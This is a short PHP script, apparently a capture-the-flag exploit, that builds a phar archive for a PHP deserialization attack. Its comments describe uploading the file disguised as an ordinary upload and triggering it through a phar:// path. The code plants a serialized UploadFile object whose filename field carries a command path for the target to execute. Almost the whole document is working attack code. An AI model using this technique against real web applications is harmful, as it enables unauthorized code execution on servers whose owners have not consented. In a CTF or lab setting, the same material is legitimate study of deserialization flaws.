<?php

/*
 * MODE OF OPERATION:
 * - remember to set "phar.readonly=false" in the cli's php.ini
 * - upload a php file: https://abhaynayar.com/ctf/phar.php
 * - phar:///var/www/uploads/2364533275f34e40933d951.86423169
 */

/*
 * NOTES:
 * - no .phar extension required
 * - metadata is unserialized
 */

@unlink("test.phar");
$phar=new Phar('test.phar');
$phar->startBuffering();

/*
 * SECTIONS:
 * 1. stub
 * 2. manifest
 * 3. file contents
 * 4. signature (optional)
 */

// STUB:
$phar->setStub('<?php echo "STUB!\n"; __HALT_COMPILER(); ? >');

// FILE CONTENTS:
$phar->addFromString('test.txt', 'text');

// METADATA:
class UploadFile {}
$o=new UploadFile;
$o->filename='/usr/local/bin/score 2fdb31a2-ca58-4650-abfb-9406be061d69';

$phar->setMetadata($o);
$phar->stopBuffering();

?>

